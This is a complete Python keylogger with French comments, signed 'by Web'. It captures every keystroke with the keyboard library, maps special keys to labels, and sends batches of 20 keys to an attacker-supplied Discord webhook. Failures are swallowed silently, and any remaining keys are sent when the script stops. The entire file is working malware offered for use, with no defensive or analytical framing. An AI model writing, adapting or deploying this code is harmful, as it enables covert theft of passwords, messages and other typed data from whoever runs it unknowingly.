#by Web-on-dsc
import keyboard
import requests
import os


WEBHOOK_URL = "[TON WEBHOOK MEC]"
BUFFER_SIZE = 20 


SPECIAL_KEYS = {
    "space": " [ESPACE]", 
    "enter": " [ENTRÉE]",
    "tab": " [TAB]",
    "backspace": " [SUPPR]",
    "esc": " [ECHAP]",
    "maj": " [SHIFT GAUCHE]",
    "ctrl": " [CTRL]",
    "alt": " [ALT]",
    "caps lock": " [CAPS LOCK]",
    "unknown": " [INCONNU]",
    "verr.maj": " [CAPS LOCK]",
    "right shift": " [SHIFT DROIT]"
}

buffer = []

def process_key(key):
    return SPECIAL_KEYS.get(key, key)  

def format_message(keys):
    return " ".join(keys)

def send_to_discord(embed_title, embed_description):
    embed = {
        "title": embed_title,
        "description": embed_description,
        "color": 0x0000,
        "footer": {
            "text": "by Web"
        }
    }
    data = {"embeds": [embed]}
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            pass
        else:
            pass
    except Exception as e:
        pass

def main():
    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == "down": 
                key = process_key(event.name)
                buffer.append(key)
              
                if len(buffer) >= BUFFER_SIZE:
                    message = format_message(buffer)  
                    send_to_discord(
                        embed_title="Keylogger - Nouvelles Touches",
                        embed_description=f"```\n{message}\n```"
                    )
                    buffer.clear()  

    except KeyboardInterrupt:
        print("", end=None)
    finally:
        if buffer:
            message = format_message(buffer)
            send_to_discord(
                embed_title="Keylogger - Script Arrêté",
                embed_description=f"```\n{message}\n```"
            )
        os._exit(1)    

if __name__ == "__main__":
    main()
